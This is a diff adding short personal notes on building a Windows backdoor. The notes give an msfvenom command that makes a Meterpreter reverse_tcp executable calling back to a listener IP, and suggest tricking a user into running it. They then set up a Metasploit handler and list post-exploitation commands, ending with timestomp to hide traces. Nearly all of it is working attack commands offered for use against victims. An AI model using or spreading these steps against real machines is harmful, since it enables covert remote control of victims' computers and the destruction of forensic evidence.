@@ -1,0 +1,28 @@
+Reverse Tools
+    To create payloads to make a backdoor on the windows machine
+        mfsvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.117 LPORT=1234 --format=exe > attack.exe
+            serve it on a website or somewhere to deliver it to the user to run it on his machine :)
+            this tool do only as an agent to establish a new TCP connection to the operation center to get commands and run on the machine and nothing more. so that will be a tiny file.
+        listen on the operation center before run it on the user machine via metasploit (msfconsole)
+            db_status
+            use exploit/multi/handler
+            set payload windows/meterpreter/reverse_tcp
+            set LHOST=192.168.0.117
+            set LPORT=1234
+            exploit -j -z
+                run in background to listen to establish connection from user machine.
+        after a new connection established, you can run different commands on the user machine like:
+            sessions -i
+                to see all sessions that is connected to the listener
+            sessions -i 1
+                to connect to the first session
+            ipconfig
+                get NIC configuration details
+            sysinfo
+                get system information
+            getuid
+                get user info
+            dir
+            cd
+            timestomp myfile.txt
+                to change last access/modified file attributes to cover and hide tracking :)
